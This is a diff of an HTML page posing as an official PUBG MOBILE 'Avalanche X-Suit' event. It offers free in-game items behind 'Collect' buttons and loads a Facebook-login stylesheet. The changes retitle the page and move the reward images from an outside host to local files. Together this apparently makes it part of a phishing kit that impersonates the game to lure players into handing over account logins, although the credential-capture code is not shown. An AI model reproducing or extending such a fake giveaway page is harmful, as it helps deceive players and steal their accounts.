@@ -15,7 +15,7 @@
 <meta name="copyright"content="PUBG MOBILE">
 <meta name="theme-color" content="#000">
 <meta property="og:image" content="https://www.pubgmobile.com/images/event/avalanchex_suit/shares/en.jpg">
-<title>PUBG MOBILE</title>
+<title>PUBG MOBILE: Avalanche X-Suit</title>
 <link rel="stylesheet" href="css/style.css">
 <link rel="stylesheet" href="css/animate.css">
 <link rel="stylesheet" href="css/login/facebook.css">
@@ -88,91 +88,91 @@ PUBG MOBILE
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/1.png">
+<img style="border-bottom: 0px;" src="img/1.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/1.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/1.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/2.png">
+<img style="border-bottom: 0px;" src="img/2.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/2.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/2.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/3.png">
+<img style="border-bottom: 0px;" src="img/3.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/3.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/3.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/4.png">
+<img style="border-bottom: 0px;" src="img/4.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/4.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/4.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/5.png">
+<img style="border-bottom: 0px;" src="img/5.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/5.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/5.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/6.png">
+<img style="border-bottom: 0px;" src="img/6.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/6.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/6.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/7.png">
+<img style="border-bottom: 0px;" src="img/7.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/7.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/7.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/8.png">
+<img style="border-bottom: 0px;" src="img/8.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/8.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/8.png">Collect</button>
 </div>
 </div>
 <div class="item itemShine">
 <div>
 <figure>
-<img style="border-bottom: 0px;" src="https://xcode1991.online/img/2022/1/9.png">
+<img style="border-bottom: 0px;" src="img/9.png">
 </figure>
 </div>
 <div>
-<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://xcode1991.online/img/2022/1/9.png">Collect</button>
+<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/9.png">Collect</button>
 </div>
 </div>
 </div> <!--- tab_rewards --->
